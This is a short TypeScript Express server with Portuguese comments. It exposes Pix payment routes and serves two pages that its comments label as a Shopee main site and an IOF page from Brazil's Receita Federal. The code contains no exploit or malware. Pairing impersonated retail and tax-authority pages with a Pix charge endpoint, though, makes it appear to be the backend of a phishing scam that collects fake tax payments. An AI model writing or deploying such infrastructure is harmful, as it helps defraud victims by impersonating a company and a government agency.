import express from 'express';
import cors from 'cors';
import path from 'path';
import { PixController } from './controllers/PixController'; // Importamos o controlador direto

const app = express();
const pixController = new PixController(); // Ligamos o motor do Pix

app.use(cors());
app.use(express.json());

// --- AQUI ESTÃO AS ROTAS DA API (GPS) ---
app.post('/pix', pixController.create);
app.get('/pix/:id', pixController.checkStatus);
app.post('/webhook', pixController.webhook);

// --- ROTA 1: SITE PRINCIPAL (SHOPEE) ---
// Quando acessar a raiz (/), entrega o index.html
const publicPath = path.resolve(__dirname, '..', 'index.html');
app.get('/', (req, res) => {
    res.sendFile(publicPath, (err) => {
        if (err) res.status(500).send("Erro ao carregar site: " + err.message);
    });
});

// --- ROTA 2: PÁGINA DE IOF (RECEITA FEDERAL) ---
// Quando acessar /iof.html, entrega o arquivo iof.html
const iofPath = path.resolve(__dirname, '..', 'iof.html');
app.get('/iof.html', (req, res) => {
    res.sendFile(iofPath, (err) => {
        if (err) res.status(500).send("Erro ao carregar IOF: " + err.message);
    });
});

const PORT = process.env.PORT || 3000;

// O '0.0.0.0' é fundamental para a Render encontrar seu app
app.listen(Number(PORT), '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando e escutando na porta ${PORT}`);
});